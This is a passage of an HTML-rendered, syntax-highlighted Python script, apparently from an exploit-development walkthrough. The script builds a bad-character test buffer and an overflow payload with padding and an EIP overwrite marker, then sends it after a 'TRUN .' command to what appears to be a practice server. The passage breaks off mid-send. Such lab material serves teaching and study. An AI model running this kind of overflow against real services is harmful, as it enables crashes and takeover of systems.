z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x44&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x45&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x46&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x47&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x48&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x49&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x50&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x51&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x52&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x53&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x54&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x55&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x56&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x57&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x58&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x59&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x60&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x62&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x63&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x64&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x65&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x66&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x67&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x68&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x69&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x70&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x71&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x72&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x73&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x74&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x76&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x77&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x78&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x79&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x80&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x81&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x82&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x83&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x84&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x85&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x86&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x87&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x88&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x89&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x90&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x91&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x92&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x93&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x94&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x95&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x96&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x97&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x98&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x99&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xaa&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xab&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xac&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xad&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xae&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xaf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xba&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbe&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xca&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xce&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xda&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xde&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xea&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xeb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xec&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xed&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xee&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xef&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfa&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfe&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xff&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 0x396f4338 = 2006
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x41&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2006&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; junk
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;4&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; eip
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;badchars&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;3000&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; filler
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TRUN .&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;send&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name 